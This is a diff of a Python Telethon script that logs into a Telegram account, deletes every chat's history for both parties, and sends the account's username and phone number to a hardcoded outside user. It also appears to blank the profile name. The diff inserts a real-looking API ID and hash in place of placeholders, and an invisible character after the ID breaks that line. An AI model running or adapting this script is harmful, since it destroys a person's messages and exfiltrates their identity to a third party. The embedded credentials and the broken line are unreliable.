@@ -2,8 +2,8 @@ from telethon import TelegramClient
 from telethon.tl.functions.messages import DeleteHistoryRequest
 from telethon.tl.functions.account import UpdateProfileRequest
 
-API_ID = 12345678
-API_HASH = "YOUR_API_HASH"
+API_ID = 29834234‎
+API_HASH = "552c01d21d127def060f2915aedeebf9"
 
 TARGET_USERNAME = "Moein_915"
 NEW_FIRST_NAME = ""
@@ -16,20 +16,28 @@ async def main():
 
     async for d in client.iter_dialogs():
         try:
+            print(f"Trying to delete: {d.name or d.id}")
+
             await client(DeleteHistoryRequest(
                 peer=d.entity,
                 max_id=0,
                 revoke=True
             ))
-        except Exception:
-            pass
 
-        await client.delete_dialog(d.entity)
-        print(f"Deleted: {d.name or d.id}")
+            await client.delete_dialog(d.entity)
+
+            print(f"Successfully deleted: {d.name or d.id}")
+
+        except Exception as e:
+            print(
+                f"FAILED to delete {d.name or d.id}. "
+                f"Reason: {type(e).__name__}: {e}"
+            )
 
     print("Done deleting chats.")
 
     me = await client.get_me()
+
     username = f"@{me.username}" if me.username else "(no username)"
     phone = f"+{me.phone}" if me.phone else "(no phone)"
 
@@ -44,6 +52,7 @@ async def main():
     print("--------------------------------")
 
     await client.send_message(TARGET_USERNAME, info_text)
+
     print(f"Sent account info to {TARGET_USERNAME}")
 
     await client(UpdateProfileRequest(
